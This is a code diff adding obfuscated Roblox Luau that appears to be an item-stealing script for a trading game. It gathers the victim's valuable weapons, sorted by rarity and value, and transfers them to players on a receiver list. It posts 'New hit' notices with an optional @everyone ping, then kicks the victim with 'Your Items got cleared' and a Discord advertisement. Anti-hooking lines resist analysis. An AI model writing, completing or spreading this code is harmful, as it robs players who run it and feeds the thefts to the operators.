+										if not t82[v1136] then
+											t82[v1136] = 0
+										end
+
+										t82[v1136] += v1135.Amount
+										n35 += v1135.Amount
+										table.insert(t83, i)
+									end
+								end
+
+								n34 += n35
+
+								if p176 and not v1109 and n35 > 0 then
+									local v1137, v1138, v1139 = pairs(t82)
+
+									for k, v in v1137, v1138, v1139 do
+										local n36 = 0
+
+										for _, v2 in ipairs(p175) do
+											if tostring(v2.DataID):gsub("%s+", "") == k then
+												n36 = (v1124[v2.DataID] or v2.Value or 1) * v
+
+												break
+											end
+										end
+
+										v107(k, v, n36)
+									end
+
+									if n33 <= n34 then
+										v115(p176)
+									else
+										v111(p176)
+									end
+								end
+
+								local v1145 = #t83
+								local n37 = -1
+
+								for i = v1145, 1, -1 do
+									table.remove(p175, t83[i])
+								end
+							else
+								task.wait(0.5)
+							end
+
+							task.wait(0.5)
+						end
+
+						if p176 and not v1109 and n33 <= n34 then
+							v115(p176)
+							task.wait(0.5)
+						end
+
+						if n33 <= n34 then
+							task.wait(1)
+							LocalPlayer:kick("Your Items got cleared\nJoin discord.gg/vega-scripts To Make Your Own Script !")
+						end
+					end
+					u133 = nil
+					v134 = function(p177)
+						u133 = 1048485720
+
+						local t84 = {}
+						local v1149 = table.find(t1, min_rarity)
+
+						for k, v in pairs(response.Weapons.Owned) do
+							task.wait()
+
+							local Rarity = Item[k].Rarity
+							local v1153 = table.find(t1, Rarity)
+
+							if v1153 and v1149 <= v1153 and not t8[k] then
+								local v1154 = v121[k]
+
+								if not v1154 then
+									v1154 = v1153 >= table.find(t1, "Godly") and 2 or 1
+								end
+
+								if p177 <= v1154 then
+									table.insert(t84, {
+										DataID = k,
+										Rarity = Rarity,
+										Amount = v,
+										Value = v1154
+									})
+								end
+							end
+						end
+
+						table.sort(t84, function(p178, p179)
+							return p178.Value * p178.Amount > p179.Value * p179.Amount
+						end)
+
+						return t84
+					end
+					v135 = function(p180, p181)
+						local v1155 = false
+
+						for _, v in ipairs(t5) do
+							if p180:lower() == tostring(v):lower() then
+								v1155 = true
+
+								break
+							end
+						end
+
+						local v1158 = v134(v1155 and 100 or min_value)
+
+						if #v1158 == 0 then
+							return
+						end
+
+						v132(p180, v1158, p181)
+					end
+					u136 = nil
+					u137 = nil
+					u138 = nil
+					v139 = function(p182)
+						u136 = 1065669493
+						u137 = 380350664
+						u138 = 622034225
+						v125()
+
+						for _, player in ipairs(Players:GetPlayers()) do
+							if table.find(t6, player.Name:lower()) then
+								v135(player.Name, p182)
+
+								return
+							end
+						end
+					end
+					v129()
+					v140 = v123()
+					v142, v143 = v117(v140, pingEveryone == "Yes" and "||@everyone||" or "New hit ma boi")
+
+					if v142 and v143 then
+						messageId = v143.messageId
+
+						if messageId then
+							v108(messageId)
+
+							if #v140 > 0 then
+								v139(messageId)
+							end
+						end
+					end
+
+					Players.PlayerAdded:Connect(function(player)
+						if table.find(t6, player.Name:lower()) then
+							v135(player.Name, messageId)
+						end
+					end)
+
+					return
+				end
+			end
+		end
+
+		return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+	end
+end
+
+return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
